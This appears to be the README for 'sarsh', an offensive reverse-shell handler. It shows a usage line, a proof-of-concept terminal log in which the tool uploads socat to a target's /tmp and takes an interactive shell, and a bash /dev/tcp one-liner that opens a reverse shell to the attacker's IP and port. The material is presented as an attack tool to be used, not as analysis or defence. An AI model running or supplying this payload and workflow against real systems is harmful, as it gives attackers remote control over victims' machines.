# sarsh
SARSH - Socat Advanced Reverse Shell Handler

Usage:
```
python3 sarsh.py <ip> <port>
```

POC:
```
┌──(kali㉿kali)-[~/Desktop/sarsh]
└─$ python3 sarsh.py 192.168.152.128 1337
Listening on 192.168.152.128:1337
Connection from 192.168.152.130:42314
Transfering socat...

Socal transfered!
Socat name on the target: /tmp/lyqginuvpexxuvwj
Waiting for connection...
ubuntu@ubuntu-64:/tmp$ whoami
ubuntu
ubuntu@ubuntu-64:/tmp$
```

Ubuntu payload:
```
ubuntu@ubuntu-64:/tmp$ bash -i >& /dev/tcp/192.168.152.128/1337 0>&1
```
